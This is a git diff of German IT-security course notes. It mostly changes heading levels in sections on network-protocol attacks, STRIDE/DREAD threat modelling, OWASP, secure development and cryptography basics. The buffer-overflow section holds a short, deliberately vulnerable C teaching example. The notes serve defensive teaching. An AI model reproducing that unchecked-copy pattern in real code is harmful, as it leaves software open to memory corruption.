     >Als unterste Schicht im OSI-Modell findet sich die physikalische Bit-übertragungsschicht (engl. physical layer). Ihre Aufgabe besteht in der Herstellung einer physikalischen Verbindung zwischen zwei direkt verbundenen Kommunikationspunkten und in der Übertragung der Bitströme. Die physikalische Schicht legt die Charakteristika der physischen Verbindung fest wie die Spannung oder Voltzahl, die zur Repräsentation von 1 und 0 benötigt werden. Darüber hinaus wird für die Netzkomponenten die Anzahl der Pins und deren Funktion definiert, der Verbindungsauf- und -abbau wird spezifiziert und der Umgang mit unterschiedlichen Transportmedien wie Koaxialkabel, Lichtwellenleiter oder Funkverbindungen wird geregelt.
@@ -665,7 +849,7 @@ Es erfolgt ein Feedback während der PVA.
 ![](links/2020-09-10_08-32-58.png)
 
 
-###### Well-Known Ports
+##### Well-Known Ports
 
 | Port | Protokoll | Dienst |
 | ---- | ---- | ---- |
@@ -678,12 +862,12 @@ Es erfolgt ein Feedback während der PVA.
 | 514 | TCP | shell |
 | 2049 | UDP | NFS | 
 
-###### NAT-Tabelle
+##### NAT-Tabelle
 
 ![](links/2020-09-10_08-41-45.png)
 
 
-##### Sicherheitsprobleme
+#### Sicherheitsprobleme
 
 ##### IP
 
@@ -723,7 +907,7 @@ Bedrohungen der Vertraulichkeit, Integrität und Verfügbarkeit des IP-Protokoll
 - Das IP-Protokoll umfasst zwei Protokolle, die aus Sicherheitssicht von Bedeutung sind, da sie Ausgangspunkt von vielen Angriffen im Internet sind. Es handelt sich dabei zum einen um das ICMP (Internet Control Message Protocol) und zum anderen um das bereits angesprochene Address Resolution Protocol (ARP). Auf Sicherheitsprobleme im Zusammenhang mit diesen beiden Protokollen wird im Folgenden kurz eingegangen.
 
 
-###### ICMP
+##### ICMP
 >Das Internet Control Message Protocol (ICMP) ist für die Übermittlung von Fehler- und Statusmeldungen zuständig. ICMP-Fehlermeldungen in- formieren u.a. über die Nichterreichbarkeit von Empfängern (destination unreachable) oder fordern zum Fragmentieren von Paketen auf (fragmentation needed), falls das übermittelte Paket zu groß war. Statusmeldungen betreffen die Verfügbarkeit von Verbindungen oder von Maschinen. Erkennt die Netzwerkschicht eines Routers eine Stausituation in einem Teilnetz, so sendet sie eine ICMP-redirect Nachricht an die an das Teilnetz angeschlossenen Router. Damit werden diese aufgefordert, die überlasteten Verbindungen zu vermeiden und stattdessen die in der Nachricht angegebenen Wege zu wählen. Mittels einer ICMP-source quench Nachricht können aber auch direkt die Verursacher eines Staus, also die Sender, beeinflusst werden. Eine solche Nachricht fordert den Sender zum Drosseln seines Nachrichtenversands auf. Informationen über den Status einer spezifischen Maschine erhält man u.a. mittels der ping-Nachricht.
 
 - Angriffe zum Abbruch von Verbindungen
@@ -734,7 +918,7 @@ Bedrohungen der Vertraulichkeit, Integrität und Verfügbarkeit des IP-Protokoll
 - Gezieltes Umleiten von Paketen
     - Redirect
     
-###### ARP
+##### ARP
 >Wie bereits erklärt, unterscheidet man zwischen der physikalischen Adresse eines Rechners und seiner logischen Adresse. Die physikalische Adresse oder Maschinenadresse ist i.d.R. eine auf dem Netzwerk-Controller als Firmware permanent abgespeicherte Adresse, während logische Adressen IP-Adressen oder Domänennamen sind. IP-Adressen oder auch die Domänennamen sind für den Aufbau flexibler Adressierungstrukturen wesentlich besser geeignet als die starren physikalischen Adressen. Ein Netzwerktreiber ist jedoch nicht in der Lage, einen Rechner über dessen logische Adresse anzusprechen, sondern benötigt dafür stets die physikalische Adresse. Da in den IP-Paketen aber nur die Sender- bzw. Empfänger IP-Adressen enthalten sind, ist ein Protokoll erforderlich, das die notwendige Abbildung bewerkstelligt. Dies ist die Aufgabe des Address Resolution Protocols (ARP). Dazu verwaltet jeder Rechner eine ARP-Adresstabelle in Form eines Schnellzugriffspeichers (engl. cache). Ein Cache-Eintrag enthält eine IP-Adresse mit der ihr zugeordneten physikalischen MAC-Adresse. Falls bei der Adressabbildung die benötigte Information nicht im Cache zugreifbar ist, wird über einen Broadcast an alle Rechner des Netzsegments eine ARP-Request Nachricht verschickt. Erkennt ein Rechner in diesem Broadcast seine eigene IP-Adresse, so schickt er dem anfragenden Rechner seine MAC-Adresse in einer ARP-Reply Nachricht zurück und der Anfrager aktualisiert damit seine Cache-Einträge.
 
 - ARP-Cache-Poisoning
@@ -743,26 +927,26 @@ Bedrohungen der Vertraulichkeit, Integrität und Verfügbarkeit des IP-Protokoll
 - Denial-of-Service-Angriffe
     - Broadcast-Sturm
 
-###### UDP und TCP
+##### UDP und TCP
 
 - Sequenznummerangriff unter TCP
 - Verbindungsübernahme
     - Session Hijacking
     - desynchronisieren
 
-###### Netzdiensten
+##### Netzdiensten
 >Die Anwendungsschicht der Internet-Protokollfamilie umfasst eine große Anzahl von Protokollen und Diensten, die hier nicht alle behandelt werden können. Im Folgenden beschränken wir uns auf einige bekannte Dienste, die kurz vorgestellt und deren Sicherheitsrisiken erläutert werden. Ausführlichere Abhandlungen finden sich unter anderem in [67]. Aufgrund der steigenden Bedeutung von Sicherheitsproblemen Web-basierter Anwendungen, wird dieser Aspekt in Abschnitt 3.5 separat behandelt.
 
 - Sniffer
     - Replay
 
-###### DNS - Domain Name Service
+##### DNS - Domain Name Service
 > Der Domain Name Service (DNS) ist ein verteilter Namensdienst, der die Aufgabe hat, symbolische Namen (DNS-Namen) auf IP-Adressen abzubilden und umgekehrt, zu einer IP-Adresse den zugehörigen DNS-Namen zu ermitteln. Die logischen Teilnetze des Internet sind hierarchisch in so genannten Domänen strukturiert. Domänen der obersten Ebene sind zweistellige Ländercodes oder Kürzel, wie com, de, edu. Die logische Struktur kann sich von der physikalischen Adressstruktur unterscheiden, so dass man von einem logischen Rechnernamen nicht unbedingt auf dessen Standort schließen kann. Ein Rechner mit dem Namen server.sec.informatik.tu-muenchen.de kann sich beispielsweise an beliebigen Orten innerhalb oder außerhalb Münchens befinden. Durch diese Flexibilität des Adressschemas ist es möglich, Dienste transparent für Benutzer zu verlagern oder auch für einen Knoten mehrere dienstspezifische Namen, wie ftp.sec.informatik.tu-muenchen.de für den Datei-Transfer und www.sec.informatik.tu-muenchen.defür den WWW-Zugriff, zu vergeben.
 
 - DNS-Spoofing
 - DNS-Cache-Poisoning
 
-##### Security Engineering
+#### Security Engineering
 
 ##### Phasen
 
@@ -780,9 +964,9 @@ niedrig bis mittel	Die Schadensauswirkungen sind begrenzt und überschaubar.
 hoch	Die Schadensauswirkungen können beträchtlich sein.
 sehr hoch	Die Schadensauswirkungen können ein existentiell bedrohliches, katastrophales Ausmaß annehmen.
 
-###### Szenarios
+##### Szenarios
 
-Gesetze
+###### Gesetze
 
 - Schadensszenario 1: Verstoß gegen Gesetze/Vorschriften/Verträge
 
@@ -794,50 +978,51 @@ Gesetze
     
         - Verträge sind unter anderem Dienstleistungsverträge im Bereich Datenverarbeitung oder auch Verträge zur Wahrung von Betriebsgeheimnissen.
 
-Selbstbestimmungsrecht
+###### Selbstbestimmungsrecht
 
 - Schadensszenario 2: Beeinträchtigung des informationellen Selbstbestimmungsrechts
  
-Unversehrtheit
+###### Unversehrtheit
 
 - Schadensszenario 3: Beeinträchtigung der persönlichen Unversehrtheit
  
-Aufgabenerfüllung
+###### Aufgabenerfüllung
 
 - Schadensszenario 4: Beeinträchtigung der Aufgabenerfüllung
  
-Negative Auswirkungen
+###### Negative Auswirkungen
 
 - Schadensszenario 5: negative Auswirkungen 
 
-Finanzielle Auswirkungen
+###### Finanzielle Auswirkungen
 
 - Schadensszenario 6: finanzielle Auswirkungen
 
 
-##### Bedrohungsmatrix
+#### Bedrohungsmatrix
 >Bei dieser Vorgehensweise klassifiziert man zunächst die Gefährdungsbereiche; sie bilden die Zeilen der Matrix. Eine mögliche Klassifikation von Gefährdungsbereichen, die die wichtigsten Problembereiche abdeckt, ist die folgende:
 
+##### Exterene Angriffe
 1.Bedrohungen durch externe Angriffe:
 Externe Bedrohungen ergeben sich durch Aktionen eines Angreifers, die er ohne die Hilfe des bedrohten technischen Systems durchführt. Zu den externen Bedrohungen zählen physische Zerstörung von Systemkomponenten sowie Diebstahl von Ressourcen wie beispielsweise von Magnetbändern, Festplatten oder ganzen Geräten wie Notebooks und Smartphones. 
 
-Interne Angriffe
+##### Interne Angriffe
 2.Bedrohungen der Datenintegrität und der Informationsvertraulichkeit:
 Unter diesen Problembereich fallen Angriffe, die gezielt versuchen, interne Kontrollen zu umgehen oder Schutzmechanismen unwirksam zu machen. Beispiele hierfür sind direkte Zugriffe auf Speichermedien unter Umgehung der Zugriffskontrolle des zugrunde liegenden Betriebssystems oder die Verwendung verdeckter Informationskanäle, um vertrauliche Informationen auszutauschen. 
 
-Denial-of-Service
+##### Denial-of-Service
 3.Bedrohungen der Verfügbarkeit und der Ressourcennutzung:
 Bedrohungen dieses Gefährdungsbereichs betreffen die unautorisierte Ressourcennutzung wie beispielsweise den Zugriff auf teure Ein/Ausgabegeräte oder die Nutzung von Rechenkapazität, bzw. die eine „normale“ Ressourcenbelegung übersteigende Nutzung von Ressourcen.
 
-Abstreiten
+##### Abstreiten
 4.Abstreiten durchgeführter Aktionen:
 Die Bedrohungen dieser Gefährdungsklasse betreffen zum einen den Bereich der Abrechnung genutzter Ressourcen wie Speicher, E/A-Geräteoder CPU-Zeit. Zum anderen betreffen sie die Abrechnung in Anspruch genommener Dienste und die daraus resultierenden rechtsverbindlichen, vertraglichen Folgen, wie das Durchführen von Banktransaktionen oder das Abwickeln elektronischer Einkäufe.
 
-Rechtemissbrauch
+##### Rechtemissbrauch
 5.Missbrauch erteilter Berechtigungen:
 Bedrohungen dieser Klasse treten auf, wenn ein autorisierter Benutzer die ihm erteilten Berechtigungen und das in ihn gesetzte Vertrauen missbraucht, indem er zum Beispiel Daten gezielt manipuliert.
 
-Auslöser
+##### Auslöser
 Die Spalten einer Bedrohungsmatrix werden durch die potentiellen Auslöser von Bedrohungen definiert. Hierunter fallen die Systemadministratoren bzw. Operatoren, die Programmierer, die System- oder Anwendungssoftware erstellen, Benutzer, die intern oder über externe Medien auf das System zugreifen. Auslöser können ferner die verwendeten Dienste, Protokolle und Ausführungsumgebungen wie zum Beispiel E-Mail-Dienste, die TCP/IP-Protokollfamilie oder die Java Virtual Machine (JVM) zur Ausführung von Java-Applets sein.
 In die Matrix trägt man potentielle Angriffsszenarien ein. Ein Auszug einer solchen Matrix ist mit Tabelle 4.2 gegeben. In den Tabelleneinträgen sind jedoch nur Beispiele für Bedrohungen festgehalten.”
 
@@ -923,13 +1108,13 @@ Sei S die Schadenshöhe (das Schadensaus maß) und E die Eintrittswahrscheinlich
     - Verfügbarkeit
     
 
-##### SDL - Security Development Lifecycle
+#### SDL - Security Development Lifecycle
 
-###### Entwicklungsphasen
+##### Entwicklungsphasen
 
 ![](links/2020-09-10_11-01-51.png)
 
-###### Bedrohungs- und Risikoanalyse
+##### Bedrohungs- und Risikoanalyse
 
 ![](links/2020-09-14_18-01-46.png)
 
@@ -949,33 +1134,33 @@ Sei S die Schadenshöhe (das Schadensaus maß) und E die Eintrittswahrscheinlich
 
 - [Beispiel STRIDE / DREAD](https://docs.microsoft.com/de-de/previous-versions/technical-content/cc405496(v=msdn.10)?redirectedfrom=MSDN)
 
-- **STRIDE**
+###### STRIDE
 
-    ![](links/2020-09-14_18-17-37.png)
-       
-    - Spoofing Identity
-    - Tampering with Data
-    - Repudiation
-    - Information Disclosure
-    - Denial of Service
-    - Elevation of Privilege
+![](links/2020-09-14_18-17-37.png)
 
-- STRIDE ist ein Acronym und steht für Spoofing Identity, Tampering with Data, Repudiation, Information Disclosure, Denial of Service und Elevation of Privilege. Das bedeutet, dass mit dem STRIDE Ansatz versucht wird, Angriffe, die diesen Angriffsklassen zuzurechnen sind, zu identifizieren, zu bewerten und geeignete Maßnahmen zur Abwehr der Angriffe festzulegen. Bei der Angriffsklasse, die auf die Veränderung von Daten abzielt (Tampering with Data), fokussiert der Ansatz vordringlich auf Angriffe zur Veränderung persistent gespeicherter Daten, wie Passwörter oder Log-Dateien, sowie auf Angriffe auf die Integrität von Datenpaketen, die über Netze übertragen werden. Repudiation-Angriffe umfassen beispielsweise nicht durchgeführte Bestellungen. Eine unberechtigte Informationsweitergabe (Information Disclosure) ist beispielsweise ein unautorisierter Datenbank-Zugriff oder aber auch der Zugriff und die Weitergabe von lokalen Daten. Zu den Angriffen mit dem Ziel, die eigenen Berechtigungen zu erhöhen (Elevation of Privileges), zählen u.a. Buffer-Overflow- oder auch SQL-Injection-Angriffe.
+- Spoofing Identity
+- Tampering with Data
+- Repudiation
+- Information Disclosure
+- Denial of Service
+- Elevation of Privilege
 
-- **DREAD**
+STRIDE ist ein Acronym und steht für Spoofing Identity, Tampering with Data, Repudiation, Information Disclosure, Denial of Service und Elevation of Privilege. Das bedeutet, dass mit dem STRIDE Ansatz versucht wird, Angriffe, die diesen Angriffsklassen zuzurechnen sind, zu identifizieren, zu bewerten und geeignete Maßnahmen zur Abwehr der Angriffe festzulegen. Bei der Angriffsklasse, die auf die Veränderung von Daten abzielt (Tampering with Data), fokussiert der Ansatz vordringlich auf Angriffe zur Veränderung persistent gespeicherter Daten, wie Passwörter oder Log-Dateien, sowie auf Angriffe auf die Integrität von Datenpaketen, die über Netze übertragen werden. Repudiation-Angriffe umfassen beispielsweise nicht durchgeführte Bestellungen. Eine unberechtigte Informationsweitergabe (Information Disclosure) ist beispielsweise ein unautorisierter Datenbank-Zugriff oder aber auch der Zugriff und die Weitergabe von lokalen Daten. Zu den Angriffen mit dem Ziel, die eigenen Berechtigungen zu erhöhen (Elevation of Privileges), zählen u.a. Buffer-Overflow- oder auch SQL-Injection-Angriffe.
 
-    ![](links/2020-09-14_18-15-41.png)
-       
-    - Damage (Schadens-) potenzial: Wie groß ist der Schaden, wenn die Sicherheitslücke ausgenutzt wird?
-    - Reproducibility (Reproduzierbarkeit): Wie leicht kann der Angriff reproduziert werden?
-    - Exploitability (Ausnutzbarkeit): Wie leicht kann ein Angriff gestartet werden?
-    - Affected (betroffene) Benutzer: Wie viele Benutzer können ungefähr betroffen sein (Angabe in Prozent)?
-    - Discoverability (Auffindbarkeit): Wie leicht kann die Sicherheitslücke aufgefunden werden?
+###### DREAD
 
-- Die qualifizierte Risikobewertung inklusive der Priorisierung der iden- tifizierten Bedrohungen erfolgt anschließend mittels der so genannten DREAD-Methode. DREAD steht für die Kriterien Damage, Reproducibility, Exploitability, Affected und Discoverability. Mit dem Kriterium des Schadenspotentials (Damage) versucht man den Schaden zu qualifizieren, der durch das Ausnutzen der Lücke entstehen könnte, die durch die Bedrohungsanalyse identifiziert wurde. Mit Reproduzierbarkeit bewertet man den Schwierigkeitsgrad zur Reproduktion des Angriffs und die Ausnutzbarkeit bewertet die Schwierigkeit, einen entsprechenden Angriff durchzuführen. Das Kriterium Affected gibt eine qualitative Einschätzung wie groß der Kreis der potentiell betroffenen Benutzer ist und die Auffindbarkeit qualifiziert den Schwierigkeitsgrad, mit dem die Sicherheitslücke aufgedeckt werden kann.
+![](links/2020-09-14_18-15-41.png)
+
+- Damage (Schadens-) potenzial: Wie groß ist der Schaden, wenn die Sicherheitslücke ausgenutzt wird?
+- Reproducibility (Reproduzierbarkeit): Wie leicht kann der Angriff reproduziert werden?
+- Exploitability (Ausnutzbarkeit): Wie leicht kann ein Angriff gestartet werden?
+- Affected (betroffene) Benutzer: Wie viele Benutzer können ungefähr betroffen sein (Angabe in Prozent)?
+- Discoverability (Auffindbarkeit): Wie leicht kann die Sicherheitslücke aufgefunden werden?
+
+Die qualifizierte Risikobewertung inklusive der Priorisierung der iden- tifizierten Bedrohungen erfolgt anschließend mittels der so genannten DREAD-Methode. DREAD steht für die Kriterien Damage, Reproducibility, Exploitability, Affected und Discoverability. Mit dem Kriterium des Schadenspotentials (Damage) versucht man den Schaden zu qualifizieren, der durch das Ausnutzen der Lücke entstehen könnte, die durch die Bedrohungsanalyse identifiziert wurde. Mit Reproduzierbarkeit bewertet man den Schwierigkeitsgrad zur Reproduktion des Angriffs und die Ausnutzbarkeit bewertet die Schwierigkeit, einen entsprechenden Angriff durchzuführen. Das Kriterium Affected gibt eine qualitative Einschätzung wie groß der Kreis der potentiell betroffenen Benutzer ist und die Auffindbarkeit qualifiziert den Schwierigkeitsgrad, mit dem die Sicherheitslücke aufgedeckt werden kann.
 
 
-#### Präsenz
+### Präsenz
 
 - Diskussion: Angriffe auf Anwendungen generell
 - Präsentation: OWASP Top 10: Was ist OWASP, wer steht dahinter?
@@ -986,19 +1171,19 @@ Sei S die Schadenshöhe (das Schadensaus maß) und E die Eintrittswahrscheinlich
 - Aufgabe und anschliessende Präsentationen: OWASP Bedrohungen A1, A3, A8 anhand entsprechender Übungen.
 - Didaktischer Puffer: Fragerunde/Diskussionsrunde zur PVA und bereits gestellter Übungsaufgaben in den Räumlichkeiten der FFHS bis zum planmässigen Ende der PVA. 
 
-####TCP/IP Schichtenmodell
+#### TCP/IP Schichtenmodell
 
 ![](links/2021-01-07_23-08-58.png)
 
-####Wieso ist die Anwendungssicherheit so wichtig?
+#### Wieso ist die Anwendungssicherheit so wichtig?
 
 ![](links/2021-01-07_23-12-11.png)
 
-####SQL Injection
+#### SQL Injection
 
 ![](links/2021-01-07_23-13-29.png)
 
-##### OWASP
+#### OWASP
 
 - Wer/Was ist OWASP?
     - The Open Web Application Security Project® (OWASP) is a nonprofit foundation that works to improve the security of software. Through community-led open source software projects, hundreds of local chapters worldwide, tens of thousands of members, and leading educational and training conferences, the OWASP Foundation is the source for developers and technologists to secure the web.
@@ -1010,7 +1195,7 @@ OWASP bedeutet Open Web Application Security Project. Es ist eine gemeinnützige
 - APIs wie AntiSamy und ESAPI 
 - Tools wie WebGoat und WebScarab
 
-#####Methodology
+##### Methodology
 
 ![](links/2021-01-07_23-16-25.png)
 
@@ -1130,9 +1315,9 @@ monitoring und analyse - must have
 
 [SDLC & OWASP Guidelines](https://owasp.org/www-project-integration-standards/writeups/owasp_in_sdlc/)
 
-#### Nachbearbeitung
+### Nachbearbeitung
 
-Memory Leak
+#### Memory Leak
 
 - Wiederholte Speicheranforderung 
 - Aber keine Löschung der angeforderten Objekte (Speicher)
@@ -1145,7 +1330,7 @@ Memory Leak
     - Code Reviews
     - Tools, die Memory Leaks feststellen
 
-##### Buffer Overflow
+#### Buffer Overflow
 
 - Buffer-Overflow-Angriffe nutzen Schwachstellen aus, die sich aus Implementierungsfehlern als Folge einer nachlässigen Programmierung ergeben. Der Ansatzpunkt für entsprechende Angriffe sind Programme, in denen Daten in einen Bereich einer Variablen fester Länge, z.B. in einen String oder ein Feld fester Länge, eingelesen bzw. kopiert werden, ohne dass das Programm prüft, ob die kopierte Eingabe überhaupt in den bereitgestellten Bereich passt. Derartige Variablen, in die Daten kopiert werden, sind abstrakt gesehen Pufferbereiche, woraus sich der Name dieses Angriffs ableitet. Durch das Schreiben einer zu großen Datenmenge in den Bereich des Puffers wird dieser zum Überlauf (engl. overflow) gebracht.
 
@@ -1166,7 +1351,7 @@ Der Speicher eines x86 Computers sieht wie folgt aus:
 - Gelingt es jedoch dem Angreifer die neue Sprungadresse so zu gestalten, dass sie auf seinen eigenen Code zeigt, kann er diesen ausführen lassen.
 - Damit hat er sein Ziel erreicht und die Basis für seinen Exploit geschaffen.
         
-
+```(java)
     /* bufferoverflow1.c */ 
     #include <stdio.h> 
     #include <stdlib.h> 
@@ -1179,10 +1364,10 @@ Der Speicher eines x86 Computers sieht wie folgt aus:
         printf("%s",buf); 
         return EXIT_SUCCESS; 
     }
-
+```
 ![](links/2021-01-07_23-30-10.png)
 
-Buffer Overflows Massnahmen
+##### Buffer Overflows Massnahmen
 
 - Defensive Programmierung 
 - Längenüberprüfungen für die Ein- und Ausgabe setzen. (z.B. strncpy anstelle von strcpy verwenden) n Verwenden einer Sprache wie Java, welche zur Laufzeit die Grenzen der Speicherbereiche überwacht.
@@ -1190,7 +1375,7 @@ Buffer Overflows Massnahmen
 - Schutzmassnahmen auf OS Ebene.
 
 
-####Time of Check, Time of Use (TOCTUE)
+#### Time of Check, Time of Use (TOCTUE)
 
 - Vertreter der „Race Condition"
 - Der Zustand eines Objekts (Berechtigungen auf das Objekt) wird nur bei der erstmaligen Benutzung kontrolliert. Spätere Zugriffe (auch von anderen Prozessen) werden nicht überprüft. Dies kann ausgenutzt werden.
@@ -1203,7 +1388,7 @@ Weitere Schwachstellen
 - Nicht ordnungsgemäss geschlossene Sessions 
 - Logische Programmierfehler, wie z.B. der Transfer von Geld in einer Anwendung, bevor das Konto auf eine genügende Deckung hin überprüft wurde
 
-###Anwendungssicherheit
+#### Anwendungssicherheit
 
 Prinzipien für die sichere Programmierung
 
@@ -1241,20 +1426,20 @@ Die wichtigsten technischen Massnahmen
 - Kryptographie:
     - Erfinden Sie keine neuen Algorithmen n Achten Sie auf eine korrekte Implementierung n Lassen Sie den kryptographischen Teil extern prüfen.
 
-###Testing
+#### Testing
 
 - Je mehr Prüfungen, Reviews und Tests gemacht werden und je mehr diese die Sicherheit als Testszenario einbinden, desto erfolgreicher wird das Endergebnis auch aus Sicht Sicherheit sein.
 - Software Testing ist aus Sicht Sicherheit ein Muss.
 - Die Qualitätssicherung einer Software unterstützt immer auch die Sicherheit. Letztendlich ist Sicherheit auch ein Qualitätsmerkmal.
 - Je früher gewisse Dinge getestet werden können, desto geringer sind die Kosten für allenfalls notwendige Änderungen.
 
-Organisation des Testens
+##### Organisation des Testens
 
 - Spezialisierte Crews (Organisationseinheiten) innerhalb der Firma für alle Projekte ergibt eine einheitliche Tiefe im Testing, aber die Use Cases sind dem Testteam nicht so bekannt.
 - Externe Firmen, welche spezialisiert auf Code Reviews sind. Diese haben eine grosse Erfahrung und können gut Vergleiche mit ähnlicher Software anstellen, kennen jedoch das konkrete Umfeld nicht.
 - Programmierer in den Projekten kennen den Use Case gut, aber haben unter Umständen eine unterschiedliche Tiefe des Testens. Zudem besteht die Gefahr der „Betriebsblindheitl.
 
-Typen von Tests
+##### Typen von Tests
 
 - Es gibt (aus Sicht Sicherheit) folgende wichtige Typen:
     - Review der Anforderungsanalyse und der vorgeschlagenen Lösungsarchitektur aus dem Blickwinkel der Security.
@@ -1263,7 +1448,7 @@ Typen von Tests
     - Regressionstest: Es sollen Nebenwirkungen durch Änderungen an einer Software auf bereits bestehende und getestete Module gefunden werden. Dieser Test ist nicht zu letzt auch nach der Inbetriebnahme wichtig, wenn die Software verändert wird.
     - Penetration/Vulnerability Test: Die Software wird mit den Augen eines Angreifers betrachtet. Der Tester versucht danach die Software zu einem unerwünschten Verhalten zu bringen um vorgängig definierte Ziele zu erreichen.
 
-Kategorien von Testtools
+##### Kategorien von Testtools
 
 - Schwachstellen Scanner 
 - Fehler-Injektionen (Blackbox-Testing) 
@@ -1274,7 +1459,7 @@ Kategorien von Testtools
 - Rootkit and Trojan Analysis 
 - Laufzeitanalysen
 
-Auslieferung und Wartung
+##### Auslieferung und Wartung
 
 - Einheit von Code, Objektcode und verlinktem Executable über alle StagingStufen (Entwicklung, Test, Abnahme, Produktion) gewährleisten.
 - Entsprechende Rollen und Verantwortlichkeiten definieren („ein Entwickler hat nichts auf der Produktion zu suchenl). n Alle Funktionen dokumentieren.
@@ -1283,41 +1468,41 @@ Auslieferung und Wartung
 - Patchmanagement und Bugfixes.
 
 
-###Security Development Life Cycle 
+#### Security Development Life Cycle 
 
-Phase 1 - Requirements
+##### Phase 1 - Requirements
 
 - Alle an einem Softwareprojekt beteiligten Personen sollten ein Security Training erhalten.
 - Die Anforderungen an die Sicherheit einer Anwendung sind genauso wie anderen Anforderungen zu definieren.
 - Es braucht Tests und Quality Gates, auch bezüglich der Sicherheit.(Sicherheit ist „nurl ein weiteres Qualitätsmerkmal!).
 - Es braucht ein Securityrisk- und Privacyrisk-assement, welches die Risiken aufzeigt und bewertet.
 
-Phase 2 - Design
+##### Phase 2 - Design
 
 - Im Design sind die Ergebnisse aus dem Risk Assessment sowie allgemein gültige Best Practices zu berücksichtigen. Zu dieser Zeit ist es noch kostengünstig, Security zu implementieren.
 - Die Angriffsfläche muss minimal gehalten werden. Dazu muss beispielsweise das Prinzip der minimalen Rechte eingehalten werden.
 - In dieser Phase soll auch ein Threat Modelling gemacht werden, welches darlegen soll, welchen Bedrohungen das konkrete Design ausgesetzt sein wird.
 
-Phase 3 - Implementation
+##### Phase 3 - Implementation
 
 - Bei der Implementation dürfen nur definierte und geprüfte Tools (Compiler, IDE, etc.) verwendet werden. Zudem muss definiert sein, welche Security Checks bereits durch diese Tools ausgeführt werden sollen.
 - Keine unsicheren Funktionen benutzen.
 - Statische Analysen des Source Codes durchführen.
 
-Phase 4 - Verification
+##### Phase 4 - Verification
 
 - In der Verifikationsphase gibt es die dynamische Programm Analysen, welche sicherstellen sollen, dass sich die Anwendung so verhält wie gefordert.
 - Mit Fuzz Testing wird versucht, das Programm zu Fehlern zu bewegen, indem es mit zufälligen oder absichtlich bösartigen Daten gefüttert wird.
 - An dieser Stelle wird auch das Bedrohungsmodell und die Angriffsfläche nochmals überprüft.
 
-Phase 5 - Release
+##### Phase 5 - Release
 
 - Es wird ein Incident Response Plan  benötigt, welcher definiert, wie auf einen Incident reagiert wird.
 - Das Final Security Review wird durchgeführt.
 - Zusätzlich können Penetration Tests, Verwundbarkeitsanalysen und manuelle Source Code Reviews gemacht werden.
 - Ist die Software fertig (Release to Manufacturing), muss eine Bestätigung erfolgen, dass alle Security Anforderungen abgedeckt sind. Die Software und alllfällige Daten müssen archiviert und gegen Modifikation geschützt werden.
 
-Incident
+#### Incident
 
 - Wird ein Incident festgestellt, z.B. eine Verwundbarkeit in der Software, muss diese analysiert, beurteilt und behoben werden.
 - Es muss entschieden werden, wie rasch eine Lösung bereitgestellt werden kann und wie viel Qualitätssicherung nötig (insbesondere Regression Testing) ist.
@@ -1329,19 +1514,19 @@ Incident
 ---
 ## 3 Kryptographie
 
-#### Lernziele
+### Lernziele
 
 - Ich kenne die Grundbegriffe und Einsatzgebiete von kryptographischen Massnahmen
 - Ich kann einfache Fehlkonfiguration in Bezug auf den Einsatz von Kryptographie erkennen
 - Ich kann Kryptographie im Alltag erkennen und deren Wirkung beurteilen.
 
-#### Vorbereitung
+### Vorbereitung
 
-##### Leitsatz
+#### Leitsatz
 
 >Sicherheit ist so stark wie das schwächste Glied
 
-##### Definition
+#### Definition
 
 >Unter Kryptographie versteht man die Lehre von den Methoden der Verschlüsselung und der Entschlüsselung. Kryptoanalyse ist die Wissenschaft vom Entschlüsseln von Nachrichten durch unauthorisierte Mithörer. Die Kryptologie schliesslich fasst die Disziplinen Kryptographie & -analyse zusammen.
 
@@ -1376,7 +1561,7 @@ Incident
     - wenig Strom und andere Ressourcen brauchen (effektiv)
     - sehr schnell sein (effizient).
     
-#####Einsatz von Kryptographie
+#### Einsatz von Kryptographie
 
 - Internet 
 - eMail 
@@ -1388,13 +1573,13 @@ Incident
 - PKI 
 - elektronische rechtsgültige Unterschrift.
 
-#####Kerckhoffscher Satz
+#### Kerckhoffscher Satz
 
 - „Die Sicherheit eines Kryptosystems darf nicht von der Geheimhaltung des Algorithmus abhängen. Die Sicherheit gründet sich nur auf die Geheimhaltung des Schlüssels.“ August de Kerckhoff, la cryptographie militaire (1883)
 - Das Verschlüsselungsverfahren (der Algorithmus) sollte offen gelegt und von möglichst vielen Kryptologen untersucht worden sein, bevor man dem Verfahren vertrauen kann.
 
     
-##### Sicherheitsziele
+#### Sicherheitsziele
 >C: Vertraulichkeit / Confidentiality 
 >Vertraulichkeit ist der Schutz vor unbefugter Preisgabe von Informationen. Vertrauliche Daten und Informationen dürfen ausschließlich Befugten in der zulässigen Weise zugänglich sein.
 
@@ -1419,7 +1604,7 @@ Incident
         - Handlungen von Benutzern oder Systemen müssen aufgezeichnet werden
 
 
-##### Krypto-Puzzle
+#### Krypto-Puzzle
 
 ![](links/2020-10-07_10-45-10.png)
 
@@ -1458,7 +1643,7 @@ Wichtig:
 
 
 
-##### Grobe Gegnerkathegorien
+#### Grobe Gegnerkathegorien
 
 - Unintelligente Gegner
     - unbeabsichtigte Fehler und Störungen (Rauschen auf Übertragungsleitungen, Stromausfall, Naturereignisse, Software- und Hardwarefehler, Benutzerfehler, etc.)
@@ -1469,7 +1654,7 @@ Wichtig:
 - Wir beschäftigen uns in diesem Kurs mehrheitlich mit der zweiten Bedrohungsart 
 - Eine unerlaubte Handlung eines Gegners bezeichnen wir als Angriff oder Attacke
 
-##### Angriffe
+#### Angriffe
 
 ![](links/2020-10-07_10-32-01.png)
 
@@ -1489,7 +1674,7 @@ Wichtig:
 - Bob 
     - Abstreiten die Meldung erhalten zu haben (Non repudiation of receipt)
 
-#####Bedrohungen I
+#### Bedrohungen I
 
 - Es gibt 8 Bedrohungen, die mit Kryptografie bekämpft werden können:
 
@@ -1502,7 +1687,7 @@ Wichtig:
 7. Sich für jemanden anders ausgeben (Masquerade)
 8. Abstreiten die Meldung erhalten zu haben (repudiation of receipt, z.B. in SIC)
 
-#####Bedrohungen II
+#### Bedrohungen II
 
 - Beispiele für Attacken, zu deren „Bekämpfung“ die kryptographischen Methoden nicht die geeigneten sind. Z.B.:
 - Denial of Service Attacken: Überlastung eines Systems, damit es nicht mehr funktioniert. n Einschleusen von Viren.
@@ -1510,7 +1695,7 @@ Wichtig:
 - Sicherheitslücken: In (allen) Betriebssystemen und Anwenderprogrammen werden laufend Schwachstellen gefunden.
 
 
-##### Verschlüsselung
+#### Verschlüsselung
 
 ![](links/2020-10-07_10-39-36.png)
 
@@ -1524,7 +1709,7 @@ Wichtig:
     - Gilt K E /= KD , dann spricht man von einem asymmetrischen oder Public Key Verfahren; z.B. RSA .
     - K E ist im asymmetrischen Fall der Public Key des Empfängers, und K D ist der Secret oder Private des Empfängers.
 
-##### Authentizierwert anhängen
+#### Authentizierwert anhängen
